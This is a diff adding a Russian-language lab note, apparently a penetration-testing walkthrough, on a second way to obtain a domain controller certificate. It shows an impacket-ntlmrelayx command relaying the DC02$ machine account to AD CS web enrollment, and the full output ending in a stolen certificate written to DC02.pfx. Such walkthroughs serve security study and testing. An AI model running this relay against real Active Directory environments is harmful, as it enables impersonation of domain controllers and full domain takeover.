@@ -58,4 +58,58 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'dc02.pfx'
 [*] Exiting...
 
+Второй вариант получения сертификата 
+
+┌──(bang㉿kali)-[~]
+└─$ impacket-ntlmrelayx -debug -smb2support --target http://192.168.0.10/certsrv/certfnsh.asp --adcs --template DomainController
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client WINRMS loaded..
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[+] Protocol Attack SMB loaded..
+[+] Protocol Attack IMAP loaded..
+[+] Protocol Attack IMAPS loaded..
+[+] Protocol Attack HTTP loaded..
+[+] Protocol Attack HTTPS loaded..
+[+] Protocol Attack DCSYNC loaded..
+[+] Protocol Attack RPC loaded..
+[+] Protocol Attack MSSQL loaded..
+[+] Protocol Attack WINRMS loaded..
+[+] Protocol Attack LDAP loaded..
+[+] Protocol Attack LDAPS loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Setting up WinRM (HTTP) Server on port 5985
+[*] Setting up WinRMS (HTTPS) Server on port 5986
+[*] Setting up RPC Server on port 135
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections
+[*] (SMB): Received connection from 192.168.0.100, attacking target http://192.168.0.10
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (SMB): Authenticating connection from WORK/DC02$@192.168.0.100 against http://192.168.0.10 SUCCEED [1]
+[*] (SMB): Received connection from 192.168.0.100, attacking target http://192.168.0.10
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (SMB): Authenticating connection from WORK/DC02$@192.168.0.100 against http://192.168.0.10 SUCCEED [2]
+[*] http://WORK/DC02$@192.168.0.10 [1] -> Generating CSR...
+[*] http://WORK/DC02$@192.168.0.10 [1] -> CSR generated!
+[*] http://WORK/DC02$@192.168.0.10 [1] -> Getting certificate...
+[*] http://WORK/DC02$@192.168.0.10 [1] -> GOT CERTIFICATE! ID 24
+[*] http://WORK/DC02$@192.168.0.10 [2] -> Skipping user DC02$ since attack was already performed
+[*] http://WORK/DC02$@192.168.0.10 [1] -> Writing PKCS#12 certificate to ./DC02.pfx
+[*] http://WORK/DC02$@192.168.0.10 [1] -> Certificate successfully written to file
 
